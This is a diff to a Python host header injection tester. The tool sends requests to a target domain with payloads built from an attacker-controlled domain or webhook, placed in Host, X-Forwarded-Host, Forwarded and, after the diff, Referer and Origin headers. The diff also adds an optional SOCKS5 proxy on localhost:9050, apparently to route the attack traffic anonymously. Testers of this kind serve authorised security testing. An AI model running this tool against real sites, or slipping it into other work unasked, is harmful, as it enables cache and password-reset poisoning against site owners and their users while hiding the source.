@@ -49,15 +49,16 @@ def generate_payloads(target, attacker):
         f"{attacker}?{target}"
     ]
 
-def send_requests(target, attacker):
-    headers_list = ["Host", "X-Host", "X-Forwarded-Host", "Forwarded"]
+def send_requests(target, attacker, use_proxy):
+    headers_list = ["Host", "X-Host", "X-Forwarded-Host", "Forwarded", "Referer", "Origin"]
     payloads = generate_payloads(target, attacker)
-
+    proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"} if use_proxy else {}
+    
     for payload in payloads:
         for header in headers_list:
             headers = {header: payload}
             try:
-                response = requests.get(f"http://{target}", headers=headers, timeout=5)
+                response = requests.get(f"http://{target}", headers=headers, proxies=proxies, timeout=5)
                 status_msg = f"[+] Sent {header}: {payload} -> Status: {response.status_code}"
                 if response.status_code != 200:
                     print(colored(status_msg, 'red'))
@@ -70,6 +71,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Host Header Injection Tester")
     parser.add_argument("target", help="Target domain to test")
     parser.add_argument("attacker", help="Attacker-controlled domain or webhook")
-
+    parser.add_argument("--proxy", action="store_true", help="Use SOCKS5 proxy at socks5://localhost:9050")
+    
     args = parser.parse_args()
-    send_requests(args.target, args.attacker)
+    send_requests(args.target, args.attacker, args.proxy)
